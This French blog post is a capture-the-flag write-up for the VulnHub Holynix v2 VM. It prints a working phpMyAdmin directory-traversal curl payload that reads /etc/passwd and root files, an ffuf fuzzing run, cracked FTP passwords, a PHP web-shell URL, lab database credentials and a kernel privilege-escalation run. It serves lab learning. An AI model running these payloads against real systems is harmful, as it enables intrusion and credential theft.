# Solution du CTF Holynix #2 de VulnHub

[Holynix: v2](https://vulnhub.com/entry/holynix-v2,21/) n'a pas été le plus simple à résoudre avec des actions à mener qui sortaient trop de l'ordinaire pour même y penser. Ainsi il s'est avéré qu'il fallait modifier à deux reprises l'adresse IP de la machine hôte ou comme moi utiliser une seconde machine virtuelle, ce qui complique considérablement les étapes.

C'était d'autant plus difficile que la VM utilise une adresse IP statique qui a le mauvais goût d'être `192.168.1.88` donc correspondant probablement au netmask de votre réseau et vous obligeant à importer la VM en mode `bridge` au lieu du mode `host only` plus secure.

Il faut voir que le CTF date de 2010 alors que la version initiale de Docker date de 2013 et c'était sans doute encore les balbutiement de l'utilisation des containers. L'auteur du CTF a voulu proposer un scénario multi-machine avant l'heure et on ne peut pas lui en vouloir pour ça mais c'était un peu tiré par les cheveux.

```shellsession
$ sudo nmap -T5 -p- -sCV 192.168.1.88
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-04 20:50 CET
Nmap scan report for 192.168.1.88
Host is up (0.00027s latency).
Not shown: 65443 filtered tcp ports (no-response), 87 filtered tcp ports (port-unreach)
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      Pure-FTPd
22/tcp open   ssh      OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|_  1024 969348cc68568eeeed6c26a7c11c6a41 (DSA)
53/tcp open   domain   ISC BIND 9.4.2-P2.1
| dns-nsid: 
|_  bind.version: 9.4.2-P2.1
80/tcp open   http     Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
|_http-title: ZincFTP
MAC Address: 00:0C:29:A3:18:FA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Transfert et autolargue

Quand on se rend sur le site web on a un message suivi d'un formulaire de création de compte qui demande un nom d'utilisateur er une adresse email :

> ### Welcome to www.zincftp.com
> 
> Our nameservers are located at ns1.zincftp.com & ns2.zincftp.com  
> To access your web directory navigate to **http://username.zincftp.com**
> 
> If you are not yet a user of zincftp you can request membership by entering your information below and one of the administrators will get back to within 2 business days.

`Wapiti` n'a décelé aucune vulnérabilité sur le formulaire.

On voit que le port DNS TCP est ouvert. TCP est en général utilisé uniquement pour les transfert de zones (AXFR) sur DNS. J'ai donc tenté un transfert avec `dig -t AXFR zincftp.com @192.168.1.88` mais l'accès était refusé.

J'ai alors procédé à une énumération DNS plus classique (donc par brute force). Pas de pitié, DNS est un protocol qui sait encaisser.

```shellsession
$ gobuster dns -d zincftp.com -r 192.168.1.88 -w fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Domain:     zincftp.com
[+] Threads:    10
[+] Resolver:   192.168.1.88
[+] Timeout:    1s
[+] Wordlist:   fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt
===============================================================
2022/12/04 21:02:58 Starting gobuster
===============================================================
Found: www.zincftp.com
Found: dev.zincftp.com
Found: mta.zincftp.com
Found: trusted.zincftp.com
Found: tmartin.zincftp.com
===============================================================
2022/12/04 21:03:03 Finished
===============================================================
```

J'ai carrément enchainé avec `rockyou` pour plus de résultats :

```
Found: username.zincftp.com
Found: trusted.zincftp.com
Found: jsmith.zincftp.com
Found: tmartin.zincftp.com
Found: cmanson.zincftp.com
Found: USERNAME.zincftp.com
Found: Jsmith.zincftp.com
Found: www.zincftp.com
Found: splath.zincftp.com
Found: jstreet.zincftp.com
Found: gwelch.zincftp.com
Found: dev.zincftp.com
Found: cbergey.zincftp.com
Found: Username.zincftp.com
Found: USerNAme.zincftp.com
Found: Trusted.zincftp.com
Found: TRUSTED.zincftp.com
Found: Hmcknight.zincftp.com
```

Finalement j'ai fait une énumération web qui m'a trouvé quelques fichiers et dossiers dont 3 donnent un 403 (accès refusé) :

```
200       43l      127w     1205c http://zincftp.com/index.php
403       10l       33w      329c http://zincftp.com/phpMyAdmin
200        1l        2w       16c http://zincftp.com/register.php
403       10l       33w      332c http://zincftp.com/server-status
200        0l        0w        0c http://zincftp.com/dbconn.php
403       10l       33w      331c http://zincftp.com/setup_guides
```

J'ai fait un long tour de ces domaines ce qui n'était ni utile ni agréable.

J'ai du me débloquer en trouvant l'astuce sur le web : il fallait récupérer l'adresse IP du serveur DNS secondaire et on découvrait que ce n'était pas la même que celle du serveur :

```
$ dig -t A ns2.zincftp.com @192.168.1.88

; <<>> DiG 9.18.9 <<>> -t A ns2.zincftp.com @192.168.1.88
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 2693
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;ns2.zincftp.com.               IN      A

;; ANSWER SECTION:
ns2.zincftp.com.        38400   IN      A       192.168.1.89

;; AUTHORITY SECTION:
zincftp.com.            38400   IN      NS      ns2.zincftp.com.
zincftp.com.            38400   IN      NS      ns1.zincftp.com.

;; ADDITIONAL SECTION:
ns1.zincftp.com.        38400   IN      A       192.168.1.88

;; Query time: 0 msec
;; SERVER: 192.168.1.88#53(192.168.1.88) (UDP)
;; WHEN: Sun Dec 04 22:51:00 CET 2022
;; MSG SIZE  rcvd: 108

```

J'avais une vieille VM CentOS 5 qui trainait, sans doute utilisée un jour pour compiler un exploit spécifique. Je l'ai reconfiguré avec l'adresse `192.168.1.89` et j'ai fait le transfert de zone :

```shellsession
# dig -t AXFR zincftp.com @192.168.1.88
; <<>> DiG 9.3.6-P1-RedHat-9.3.6-4.P1.el5_4.2 <<>> -t AXFR zincftp.com @192.168.1.88                                   
;; global options:  printcmd                                                                                           
zincftp.com.        38400   IN  SOA ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400               
zincftp.com.        38400   IN  NS  ns1.zincftp.com.                                                                   
zincftp.com.        38400   IN  NS  ns2.zincftp.com.                                                                   
zincftp.com.        38400   IN  MX  10 mta.zincftp.com.                                                                
zincftp.com.        38400   IN  A   192.168.1.88                                                                       
ahuxley.zincftp.com.    38400   IN  A   192.168.1.88                                                                   
amckinley.zincftp.com.  38400   IN  A   192.168.1.88                                                                   
bzimmerman.zincftp.com. 38400   IN  A   192.168.1.88                                                                   
cbergey.zincftp.com.    38400   IN  A   192.168.1.88                                                                   
cfinnerly.zincftp.com.  38400   IN  A   192.168.1.88                                                                   
cjalong.zincftp.com.    38400   IN  A   192.168.1.88                                                                   
cmahong.zincftp.com.    38400   IN  A   192.168.1.88                                                                   
cmanson.zincftp.com.    38400   IN  A   192.168.1.88                                                                   
ddonnovan.zincftp.com.  38400   IN  A   192.168.1.88                                                                   
ddypsky.zincftp.com.    38400   IN  A   192.168.1.88                                                                   
dev.zincftp.com.    38400   IN  A   192.168.1.88                                                                       
dhammond.zincftp.com.   38400   IN  A   192.168.1.88                                                                   
dmoran.zincftp.com. 38400   IN  A   192.168.1.88                                                                       
dsummers.zincftp.com.   38400   IN  A   192.168.1.88                                                                   
evorhees.zincftp.com.   38400   IN  A   192.168.1.88                                                                   
gwelch.zincftp.com. 38400   IN  A   192.168.1.88                                                                       
hmcknight.zincftp.com.  38400   IN  A   192.168.1.88                                                                   
jgacy.zincftp.com.  38400   IN  A   192.168.1.88                                                                       
jsmith.zincftp.com. 38400   IN  A   192.168.1.88                                                                       
jstreet.zincftp.com.    38400   IN  A   192.168.1.88                                                                   
kmccallum.zincftp.com.  38400   IN  A   192.168.1.88                                                                   
lnickerbacher.zincftp.com. 38400 IN A   192.168.1.88                                                                   
lsanderson.zincftp.com. 38400   IN  A   192.168.1.88                                                                   
lwestre.zincftp.com.    38400   IN  A   192.168.1.88                                                                   
mta.zincftp.com.    38400   IN  A   10.0.192.48                                                                        
ncobol.zincftp.com. 38400   IN  A   192.168.1.88                                                                       
ns1.zincftp.com.    38400   IN  A   192.168.1.88                                                                       
ns2.zincftp.com.    38400   IN  A   192.168.1.89                                                                       
rcropper.zincftp.com.   38400   IN  A   192.168.1.88                                                                   
rfrost.zincftp.com. 38400   IN  A   192.168.1.88                                                                       
rwoo.zincftp.com.   38400   IN  A   192.168.1.88                                                                       
skrymple.zincftp.com.   38400   IN  A   192.168.1.88                                                                   
splath.zincftp.com. 38400   IN  A   192.168.1.88                                                                       
tmartin.zincftp.com.    38400   IN  A   192.168.1.88                                                                   
trusted.zincftp.com.    38400   IN  A   192.168.1.34                                                                   
www.zincftp.com.    38400   IN  A   192.168.1.88                                                                       
zincftp.com.        38400   IN  SOA ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400               
;; Query time: 1 msec                                                                                                  
;; SERVER: 192.168.1.88#53(192.168.1.88)
;; WHEN: Wed Jun 10 01:39:51 2020                                                                                      
;; XFR size: 42 records (messages 1)
```

C'est sûr qu'on a déjà plus d'entrées... Sur les hôtes virtuels correspondant à des noms de personnes on trouve parfois quelques fichiers mais rien qui ne semble d'utilité au CTF.

On remarque en revanche que `trusted.zincftp.com` est lié à encore une autre adresse IP. J'aurais sans doute du réutiliser la même vieille VM mais à la place j'en ai créé une autre histoire de tester [openSUSE MicroOS](https://microos.opensuse.org/). La mise en place a été plus compliquée que ce que j'espérais avec du `SELinux` à configurer pour activer le forwarding SSH... enfin bref.

Finalement le plus simple a été de lancer un proxy `Squid` sur la VM comme ça je pouvais utiliser mon navigateur en apparaissant avec la bonne adresse IP.

Grace à cette astuce j'avais finalement accès aux dossiers `phpMyAdmin` et `setup_guides`. On trouve d'ailleurs un fichier `todo` dans le listing :

```
<!--
Adding new users to the system
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

create user
        useradd -g ftp_users -s /bin/false -d /home/<username> -m <username>

create web dir
        mkdir /home/<username>/web

set ownership so ftp can write to dir
        chown -R vftp:ftp_users /home/<username>

add ftp user
        pure-pw useradd <username> -u vftp -g ftp_users -d /home/<username>

update /etc/pure-ftpd/pureftpd.passwd file
        pure-pw mkdb
-->
```

Quand au `phpMyAdmin` il est configuré sans authentification (il était seulement bloqué par le 403). On y trouve une seule base de données avec une seule table qui n'a aucune information sensible.

## Rétro lasers en action

Il y avait fort à parier que la version du `phpMyAdmin` était vulnérable à une vulnérabilité et c'était le cas : un [exploit existe pour phpMyAdmin 2.6.4-pl1](https://www.exploit-db.com/exploits/1244) de type directory traversal.

L'exploit est écrit en `perl` et je préfère me casser un bras que de l'utiliser alors j'ai juste appliqué ce qu'il fait en commande `curl` :

```shellsession
$ curl -x http://192.168.1.34:3128/ \ 
-XPOST http://www.zincftp.com/phpMyAdmin/libraries/grab_globals.lib.php \
--data "usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=../../../../..//etc/passwd&subform[1][cXIb8O3]=1"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
--- snip ---
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
bind:x:104:111::/var/cache/bind:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:106:115:MySQL Server,,,:/var/lib/mysql:/bin/false
lsanderson:x:1000:114:Lyle Sanderson:/home/lsanderson:/bin/bash
cfinnerly:x:1001:100:Chuck Finnerly:/home/cfinnerly:/bin/bash
ddonnovan:x:1002:100:David Donnovan:/home/ddonnovan:/bin/bash
skrymple:x:1003:100:Shelly Krymple:/home/skrymple:/bin/bash
amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash
cmahong:x:1005:2002::/home/cmahong:/bin/false
lnickerbacher:x:1006:2002::/home/lnickerbacher:/bin/false
jstreet:x:1007:2002::/home/jstreet:/bin/false
rwoo:x:1008:2002::/home/rwoo:/bin/false
kmccallum:x:1009:2002::/home/kmccallum:/bin/false
cjalong:x:1010:2002::/home/cjalong:/bin/false
jsmith:x:1011:2002::/home/jsmith:/bin/false
dhammond:x:1012:2002::/home/dhammond:/bin/false
hmcknight:x:1013:2002::/home/hmcknight:/bin/false
lwestre:x:1014:2002::/home/lwestre:/bin/false
gwelch:x:1015:2002::/home/gwelch:/bin/false
dmoran:x:1016:2002::/home/dmoran:/bin/false
dsummers:x:1017:2002::/home/dsummers:/bin/false
bzimmerman:x:1018:2002::/home/bzimmerman:/bin/false
ncobol:x:1019:2002::/home/ncobol:/bin/false
ddypsky:x:1020:2002::/home/ddypsky:/bin/false
rcropper:x:1021:2002::/home/rcropper:/bin/false
cbergey:x:1022:2002::/home/cbergey:/bin/false
tmartin:x:1023:2002::/home/tmartin:/bin/false
jgacy:x:1024:2002::/home/jgacy:/bin/false
splath:x:1025:2002::/home/splath:/bin/false
evorhees:x:1026:2002::/home/evorhees:/bin/false
rfrost:x:1027:2002::/home/rfrost:/bin/false
ahuxley:x:1028:2002::/home/ahuxley:/bin/false
webmaster:x:1029:2002::/var/www:/bin/false
cmanson:x:1030:2002::/home/cmanson:/bin/false
vftp:x:1031:2002:Virtual FTP User:/dev/null:/bin/false
```

Il s'agit en réalité d'une faille d'inclusion car si on charge le fichier `register.php` vu au tout début de cet article on n'ontient pas de code PHP.

Mon idée initiale était donc de trouver un fichier à inclure dans lequel je pourrais aussi injecter du code PHP (fichier de log par exemple). A noter que le path a un préfixe par conséquent ça élimine certaines techniques d'exploitation.

J'ai utiliser `ffuf` pour essayer de trouver des fichiers intéressants :

```shellsession
$ ffuf -x http://192.168.1.34:3128/ -u http://www.zincftp.com/phpMyAdmin/libraries/grab_globals.lib.php  -X POST -d "usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=../../../../../FUZZ&subform[1][cXIb8O3]=1"  -H "Content-type: application/x-www-form-urlencoded" -w wordlists/files/Linux-files.txt -fr "failed to open stream:"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://www.zincftp.com/phpMyAdmin/libraries/grab_globals.lib.php
 :: Wordlist         : FUZZ: wordlists/files/Linux-files.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=../../../../../FUZZ&subform[1][cXIb8O3]=1
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://192.168.1.34:3128/
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: failed to open stream:
________________________________________________

/etc/group              [Status: 200, Size: 669, Words: 1, Lines: 56]
/etc/motd               [Status: 200, Size: 419, Words: 51, Lines: 12]
/etc/hosts              [Status: 200, Size: 244, Words: 21, Lines: 11]
/etc/passwd             [Status: 200, Size: 2604, Words: 14, Lines: 58]
/proc/version           [Status: 200, Size: 150, Words: 19, Lines: 2]
/etc/issue              [Status: 200, Size: 809, Words: 254, Lines: 32]
/proc/cmdline           [Status: 200, Size: 63, Words: 4, Lines: 2]
/proc/mounts            [Status: 200, Size: 707, Words: 76, Lines: 16]
/etc/init.d/apache2     [Status: 200, Size: 5736, Words: 1321, Lines: 198]
/etc/mysql/my.cnf       [Status: 200, Size: 3897, Words: 485, Lines: 148]
/etc/apache2/apache2.conf [Status: 200, Size: 10587, Words: 1539, Lines: 299]
/etc/apache2/ports.conf [Status: 200, Size: 59, Words: 8, Lines: 6]
/root/.bashrc           [Status: 200, Size: 2227, Words: 293, Lines: 73]
/etc/apache2/sites-available/default [Status: 200, Size: 11041, Words: 491, Lines: 576]
:: Progress: [62/62] :: Job [1/1] :: 120 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Pas terrible ! Heureusement je me suis rapellé du fichier mentionné dans le `todo` : `/etc/pure-ftpd/pureftpd.passwd`

```
cmahong:$1$vUW5q3t0$9RZSkReNoWGCaPtL7ixLX0:1031:2002::/home/cmahong/./::::::::::::
lnickerbacher:$1$yiEZKCE0$BOuvM8nrfoNGWAcjPenpa.:1031:2002::/home/lnickerbacher/./::::::::::::
jstreet:$1$sBGmOuB0$TPHx0jBSFjtJu7dJXb4Nw/:1031:2002::/home/jstreet/./::::::::::::
rwoo:$1$VZxDrE30$p7NPDTkxuQhPSsLpi2a1H1:1031:2002::/home/rwoo/./::::::::::::
cfinnerly:$1$dRGyIOy0$OVGBtLHyxFjPg7tmxtvHY/:1031:2002::/home/cfinnerly/./::::::::::::
kmccallum:$1$dijBzwn0$qlGcbcTT0Qyg8wQf4.QiG1:1031:2002::/home/kmccallum/./::::::::::::
cjalong:$1$FVj4if60$BWSIDiE97oTKUs70qOjZx/:1031:2002::/home/cjalong/./::::::::::::
jsmith:$1$yQKaOpR0$UdySwRtPd1upTckQ5/.CM/:1031:2002::/home/jsmith/./::::::::::::
lsanderson:$1$gzIP52U0$cL6XE61yDZD0unvIIkV8l/:1031:2002::/home/lsanderson/./::::::::::::
dhammond:$1$yK9OuzZ0$W7mgvS4SisxP1BwdLsuy1/:1031:2002::/home/dhammond/./::::::::::::
hmcknight:$1$A07SpdB0$hs/m8KyoJyY3gVAhlWDQI/:1031:2002::/home/hmcknight/./::::::::::::
lwestre:$1$.R5Dbl60$n2ajoJce/LnPVCq497sUQ.:1031:2002::/home/lwestre/./::::::::::::
gwelch:$1$/uYT22Y0$njR3vmLQrbnAugwkNLgJ5/:1031:2002::/home/gwelch/./::::::::::::
dmoran:$1$JZrJXdU0$ORe5.yRgQHCQl6h14rEEe.:1031:2002::/home/dmoran/./::::::::::::
dsummers:$1$VXo3pWp0$v0J7NsxRhDy/ufU01P/ch1:1031:2002::/home/dsummers/./::::::::::::
bzimmerman:$1$rQep6B90$ZtnoFZpTEBkNoRCfqJRpe/:1031:2002::/home/bzimmerman/./::::::::::::
amckinley:$1$45Bz0af0$Fsfo.XXcLkVzSaH5bLjzI0:1031:2002::/home/amckinley/./::::::::::::
ncobol:$1$q.xxgp70$645DFncdOFc24n93la5a70:1031:2002::/home/ncobol/./::::::::::::
ddypsky:$1$ccUhlpJ0$PO/WATKUekwaPct4zXeV9.:1031:2002::/home/ddypsky/./::::::::::::
rcropper:$1$Qhw2Vff0$QDvQMEe9CGFwVrvVUPqTz0:1031:2002::/home/rcropper/./::::::::::::
ddonnovan:$1$1z2APl80$uAyYFZLPu/WRkkpegD3Ht.:1031:2002::/home/ddonnovan/./::::::::::::
cbergey:$1$MOwY3Ie0$LcgARpcVk8Hf8n.E7itC40:1031:2002::/home/cbergey/./::::::::::::
tmartin:$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.:1031:2002::/home/tmartin/./::::::::::::
jgacy:$1$b.0bYDi0$sSMXaRDSZu8YvWVz.wfCo0:1031:2002::/home/jgacy/./::::::::::::
splath:$1$jbdcsaj0$7uaXto3yRZWwDp5VEbJQV/:1031:2002::/home/splath/./::::::::::::
skrymple:$1$zjyNa1C0$x2JA4Tm61q3N0Fq06gXun1:1031:2002::/home/skrymple/./::::::::::::
evorhees:$1$ITHWZZd0$Qhs38Q7QpRTe./Npk25hu/:1031:2002::/home/evorhees/./::::::::::::
rfrost:$1$3Nqexaj0$eJv5nfOYM71jvlTEA1iv..:1031:2002::/home/rfrost/./::::::::::::
ahuxley:$1$ObpCAT60$LTqCcrqMGAgv8YMyva5Sr0:1031:2002::/home/ahuxley/./::::::::::::
cmanson:$1$gMHNCq70$RCOXC8pfElSRvh5BFc5fF0:1031:2002::/home/cmanson/./::::::::::::
webmaster:$1$v2tdHOX0$MnLOX4cXqZYL99QbDDZ/1/:1031:2002::/var/www/./::::::::::::
```

JohnTheRipper permet d'en casser trois :

```
millionaire      (tmartin)     
bravenewworld    (ahuxley)     
chatterbox1      (cbergey)
```

Ces identifiants ne permettent pas de se connecter en SSH mais je peux me connecter via SSH et déposer un shell PHP dans le dossier `web` de l'utilisateur. Et hop on est parti :

http://ahuxley.zincftp.com/shell.php?cmd=uname%20-a

Je remarque des identifiants différents entre l'hôte par défaut (`/var/www/htdocs/dbconn.php`) :

```php
<?php
        $db_host = 'localhost';
        $db_user = 'phpadmin';
        $db_pass = 'userPasswd421';
        $db_name = 'zincftp_data';
        $conn = mysql_connect($db_host, $db_user, $db_pass) or die("Unable to connect to MySQL");
        mysql_select_db($db_name,$conn) or die("Could not select Database");
?>
```

et celui de développement (`/var/www/dev/dbconn.php`) :

```php
<?php
        $db_host = 'localhost';
        $db_user = 'root';
        $db_pass = 'dynamo59956783';
        $db_name = '_zincftp_data';
        $conn = mysql_connect($db_host, $db_user, $db_pass) or die("Unable to connect to MySQL");
        mysql_select_db($db_name,$conn) or die("Could not select Database");
?>
```

Mais l'un comme l'autre ne m'ont pas ouvert plus de portes.

## Cornofulgurs

En regardant les fichiers des nombreux utilisateurs j'ai trouvé ce message qui nous permet de nous connecter en tant que `amckinley` :

```shellsession
www-data@holynix2:/home$ cat ./amckinley/my_key.eml 
Delivered-To: amckinley@zincftp.com
Received: by 10.14.53.2 with SMTP id f2cs104681eec;
        Sun, 5 Dec 2010 19:20:58 -0800 (PST)
Received: by 10.229.81.74 with SMTP id w10mr4003536qck.75.1291605657402;
        Sun, 05 Dec 2010 19:20:57 -0800 (PST)
Return-Path: <lsanderson@zincftp.com>
Received: from mta.zincftp.com (mta.zincftp.com [10.0.192.48])
        by mta.zincftp.com with ESMTP id m12si9791432qck.133.2010.12.05.19.20.57;
        Sun, 05 Dec 2010 19:20:57 -0800 (PST)
Received-SPF: neutral (zincftp.com: 10.0.192.48 is neither permitted nor denied by best guess record for domain of lsanderson@zincftp.com) client-ip=10.0.192.48;
Authentication-Results: mta.zincftp.com; spf=neutral (zincftp.com: 10.0.192.48 is neither permitted nor denied by best guess record for domain of lsanderson@zincftp.com) smtp.mail=lsanderson@zincftp.com
Received: by mta.zincftp.com with SMTP id 5so10705863qwg.31
        for <amckinley@zincftp.com>; Sun, 05 Dec 2010 19:20:57 -0800 (PST)
MIME-Version: 1.0
Received: by 10.229.96.136 with SMTP id h8mr3946849qcn.184.1291605656745; Sun,
 05 Dec 2010 19:20:56 -0800 (PST)
Received: by 10.229.67.90 with HTTP; Sun, 5 Dec 2010 19:20:56 -0800 (PST)
X-Originating-IP: [10.45.6.113]
Date: Sun, 5 Dec 2010 22:20:56 -0500
Message-ID: <AANLkTimDEHGtAGCx2nA6fYRvuJOegzg0=aQzsKBVnNf4@mta.zincftp.com>
Subject: RE: I forgot my ssh password
From: Lyle Sanderson <lsanderson@zincftp.com>
To: amckinley@zincftp.com
Content-Type: multipart/alternative; boundary=0016364edc1c5c38940496b56067

--0016364edc1c5c38940496b56067
Content-Type: text/plain; charset=ISO-8859-1

I can't retrieve your password only the hash, so I've reset it for you.
Your new password is your first and last name, all lower case, followed by 2ba9

You should change it when you log in.



--0016364edc1c5c38940496b56067
Content-Type: text/html; charset=ISO-8859-1
Content-Transfer-Encoding: quoted-printable

I can't retrieve your password only the hash, so I've reset it for you.<br />
Your new password is your first and last name, all lower case, followed by 2ba9<br /><br />
You should change it when you log in.<br /><br />


--0016364edc1c5c38940496b56067--
www-data@holynix2:/home$ grep mckinley /etc/passwd
amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash
www-data@holynix2:/home$ su amckinley
Password: 
amckinley@holynix2:/home$ id
uid=1004(amckinley) gid=100(users) groups=100(users)
amckinley@holynix2:/home$ sudo -l
User amckinley may run the following commands on this host:
    (root) NOPASSWD: /bin/false
```

Sûr que l'on ne va pas aller loin en exécutant `/bin/false`...

On peut utiliser l'identifiant pour un accès direct à SSH. Comme c'est un vieux système il faut rajouter une option à SSH :

```bash
ssh amckinley@192.168.1.88 -oHostKeyAlgorithms=+ssh-rsa
```

## Fulguropoings

J'ai uploadé et exécuté `LinPEAS` qui a trouvé quelques binaires setuid à l'ancienne comme `pt_chown` :

`-rwsr-xr-x 1 root root 9.4K 2010-10-21 20:33 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)`

Le script inclus aussi `exploit-suggester` qui trouve *quelques* vulnérabilités old-school :

```shellsession
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [4] do_pages_move
      Alt: sieve       CVE-2010-0415
      Source: Spenders Enlightenment
  [5] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [6] ftrex
      CVE-2008-4210
      Source: http://www.exploit-db.com/exploits/6851
  [7] half_nelson1
      Alt: econet       CVE-2010-3848
      Source: http://www.exploit-db.com/exploits/17787
  [8] half_nelson2
      Alt: econet       CVE-2010-3850
      Source: http://www.exploit-db.com/exploits/17787
  [9] half_nelson3
      Alt: econet       CVE-2010-4073
      Source: http://www.exploit-db.com/exploits/17787
  [10] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [11] pipe.c_32bit
      CVE-2009-3547
      Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c
  [12] pktcdvd
      CVE-2010-3437
      Source: http://www.exploit-db.com/exploits/15150
  [13] reiserfs
      CVE-2010-1146
      Source: http://www.exploit-db.com/exploits/12130
  [14] sock_sendpage
      Alt: wunderbar_emporium       CVE-2009-2692
      Source: http://www.exploit-db.com/exploits/9435
  [15] sock_sendpage2
      Alt: proto_ops       CVE-2009-2692
      Source: http://www.exploit-db.com/exploits/9436
    [16] video4linux
      CVE-2010-3081
      Source: http://www.exploit-db.com/exploits/15024
  [17] vmsplice1
      Alt: jessica biel       CVE-2008-0600
      Source: http://www.exploit-db.com/exploits/5092
```

Je me suis arrêté sur `sock_sendpage` :

```shellsession
amckinley@holynix2:/tmp/wunderbar_emporium$ ./wunderbar_emporium.sh 
 [+] MAPPED ZERO PAGE!
 [+] Resolved selinux_enforcing to 0xc04adf54
 [+] Resolved selinux_enabled to 0xc04adf58
 [+] Resolved security_ops to 0xc04ac4a0
 [+] Resolved sel_read_enforce to 0xc01dea10
 [+] Resolved audit_enabled to 0xc049c3a0
 [+] got ring0!
 [+] detected 2.6 style 8k stacks
sh: mplayer: not found
 [+] Disabled security of : nothing, what an insecure machine!
 [+] Got root!
# id
uid=0(root) gid=0(root) groups=100(users)
```

*Publié le 5 décembre 2022*


